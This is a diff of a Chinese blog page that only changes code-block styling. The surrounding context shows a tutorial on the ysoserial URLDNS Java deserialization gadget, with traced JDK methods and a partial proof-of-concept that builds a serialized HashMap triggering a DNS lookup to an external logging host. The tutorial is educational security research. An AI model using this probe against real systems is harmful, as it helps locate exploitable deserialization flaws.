@@ -247,7 +247,7 @@ function checkNightMode() {
 </ul>
 <h2 id="漏洞分析">漏洞分析</h2>
 <p>ysoserial里是这样生成payload的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url) <span style="color:#66d9ef">throws</span> Exception {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>             <span style="color:#75715e">//Avoid DNS resolution during payload creation</span>
 </span></span><span style="display:flex;"><span>             <span style="color:#75715e">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span>
 </span></span><span style="display:flex;"><span>             URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler();
@@ -278,7 +278,7 @@ function checkNightMode() {
 </code></pre><p>urldns是yso中较为简单的一个gadget，所以这里可以直接通过正向分析的方式进行分析</p>
 <p>看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap。因为触发反序列化的⽅法是 readObject,那么可以直奔 HashMap 类的 readObject ⽅法：</p>
 <p>HashMap#readObject</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span>
 </span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">defaultReadObject</span>();
@@ -319,13 +319,13 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>putVal这一段，这里调用了hash方法来处理key，跟进hash方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span>(Object key) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span>(Object key) {
 </span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">int</span> h;
 </span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> (key <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> 0 : (h <span style="color:#f92672">=</span> key.<span style="color:#a6e22e">hashCode</span>()) <span style="color:#f92672">^</span> (h <span style="color:#f92672">&gt;&gt;&gt;</span> 16);
 </span></span><span style="display:flex;"><span>   }
 </span></span></code></pre></div><p>这里又调用了key.hashCode方法,这里的key是一个URL对象,让我们看看URL的hashCode方法：</p>
 <p>URL#hashCode：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hashCode;
 </span></span><span style="display:flex;"><span>
@@ -334,7 +334,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>在URL类的hashCode方法中，又调用了URLStreamHandler#hashCode，并将自身传递进去：</p>
 <p>URLStreamHandler#hashCode</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>(URL u) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>(URL u) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> 0;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the protocol part.</span>
@@ -345,7 +345,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the host part.</span>
 </span></span><span style="display:flex;"><span>        InetAddress addr <span style="color:#f92672">=</span> getHostAddress(u);
 </span></span></code></pre></div><p>getHostAddress，正是这步触发了dns请求：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (u.<span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;
@@ -369,7 +369,7 @@ function checkNightMode() {
 <p>这里存在一个问题,当我们生成payload的时候,也会存在计算哈希的过程,我们需要避免这个操作,</p>
 <p>回到第一步：HashMap#readObject</p>
 <p>key是使用readObject取出来的，也就是说在writeObject一定会写入key</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">writeObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">writeObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> buckets <span style="color:#f92672">=</span> capacity();
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Write out the threshold, loadfactor, and any hidden stuff</span>
@@ -379,7 +379,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>        internalWriteEntries(s);
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>跟入internalWriteEntries</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">internalWriteEntries</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s) <span style="color:#66d9ef">throws</span> IOException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">internalWriteEntries</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s) <span style="color:#66d9ef">throws</span> IOException {
 </span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> tab;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&gt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> (tab <span style="color:#f92672">=</span> table) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> tab.<span style="color:#a6e22e">length</span>; <span style="color:#f92672">++</span>i) {
@@ -392,11 +392,11 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。</p>
 <p>此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span>(K key, V value) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span>(K key, V value) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>即</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span> {
@@ -407,7 +407,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(url,123); <span style="color:#75715e">//此时会产生dns查询</span>
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>只想判断payload在对方机器上是否成功触发，那就应该避免掉这一次dns查询以及多余的操作，回到URL#hashCode：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
 </span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
 </span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> hashCode;
 </span></span><span style="display:flex;"><span>
@@ -422,7 +422,7 @@ function checkNightMode() {
 
 
 这里的hashCode是private修饰的，所以我们需要通过反射来修改其值</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
 </span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://xrgsnqezso.yutu.eu.org&#34;</span>);
 </span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.net.URL&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
@@ -439,7 +439,7 @@ function checkNightMode() {
 
 
 当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>URLDNS.<span style="color:#a6e22e">java</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>URLDNS.<span style="color:#a6e22e">java</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
@@ -471,7 +471,7 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>回过头来看看yso的payload</p>
 <p>yso在创建URL对象时使用了三个参数的构造方法。yso用了子类继承父类的方式规避了dns查询的风险，其创建了一个内部类：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span>(URL u) <span style="color:#66d9ef">throws</span> IOException {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
@@ -659,7 +659,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 129194 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 129185 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
